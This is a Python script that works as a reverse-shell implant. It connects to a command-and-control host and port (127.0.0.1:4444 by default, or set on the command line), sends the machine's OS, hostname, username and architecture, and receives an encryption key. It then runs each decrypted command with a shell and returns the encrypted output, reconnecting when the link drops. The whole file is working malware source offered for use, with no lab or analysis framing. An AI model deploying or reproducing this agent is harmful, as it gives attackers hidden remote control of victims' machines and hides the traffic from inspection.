#!/usr/bin/env python3
import socket, json, subprocess, platform, os, sys, time, base64, threading

C2_HOST = "127.0.0.1"
C2_PORT = 4444
RECONNECT_DELAY = 5
BUFFER_SIZE = 8192


def SystemInfo():
    return json.dumps(
        {
            "os": platform.system(),
            "hostname": platform.node(),
            "user": os.environ.get("USER", os.environ.get("USERNAME", "unknown")),
            "architecture": platform.machine(),
            "agentip": C2_HOST,
            "shellmode": "Standard",
        }
    )


def DecodeKey(KeyB64):
    Key = base64.urlsafe_b64decode(KeyB64 + "==")
    return Key


def Decrypt(Key, Data):
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

    Nonce = Data[:12]
    Ct = Data[12:]
    return AESGCM(Key).decrypt(Nonce, Ct, None)


def Encrypt(Key, Plaintext):
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    import os

    Nonce = os.urandom(12)
    Ct = AESGCM(Key).encrypt(Nonce, Plaintext, None)
    return Nonce + Ct


def RunCommand(Cmd):
    try:
        R = subprocess.run(Cmd, shell=True, capture_output=True, timeout=60)
        Out = R.stdout.decode("utf-8", errors="replace")
        Err = R.stderr.decode("utf-8", errors="replace")
        Combined = (Out + Err).strip()
        return Combined if Combined else "(no output)"
    except subprocess.TimeoutExpired:
        return "[!] Command timed out"
    except Exception as E:
        return "[!] Error: " + str(E)


def Connect():
    while True:
        try:
            Sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            Sock.connect((C2_HOST, C2_PORT))

            Info = (SystemInfo() + "\n").encode()
            Sock.sendall(Info)

            KeyLine = b""
            while not KeyLine.endswith(b"\n"):
                B = Sock.recv(1)
                if not B:
                    raise ConnectionError(
                        "Server closed connection during key exchange"
                    )
                KeyLine += B
            Key = DecodeKey(KeyLine.strip().decode())

            while True:
                Data = b""
                while True:
                    Chunk = Sock.recv(BUFFER_SIZE)
                    if not Chunk:
                        raise ConnectionError("Disconnected")
                    Data += Chunk
                    if len(Chunk) < BUFFER_SIZE:
                        break

                if Data == b"__PING__" or Data.startswith(b"\x00"):
                    try:
                        Dec = Decrypt(Key, Data)
                        if Dec == b"__PING__":
                            Sock.sendall(Encrypt(Key, b"__PONG__"))
                            continue
                        Cmd = Dec.decode("utf-8").strip()
                    except Exception:
                        continue
                else:
                    try:
                        Dec = Decrypt(Key, Data)
                        Cmd = Dec.decode("utf-8").strip()
                    except Exception as E:
                        Sock.sendall(
                            Encrypt(Key, ("[!] Decrypt error: " + str(E)).encode())
                        )
                        continue

                if not Cmd:
                    continue

                Output = RunCommand(Cmd)
                Enc = Encrypt(Key, (Output + "<END>").encode())
                Sock.sendall(Enc)

        except Exception as E:
            sys.stderr.write("[!] Connection lost: " + str(E) + "\n")
            try:
                Sock.close()
            except Exception:
                pass
            time.sleep(RECONNECT_DELAY)


if __name__ == "__main__":
    if len(sys.argv) >= 3:
        C2_HOST = sys.argv[1]
        C2_PORT = int(sys.argv[2])
    Connect()
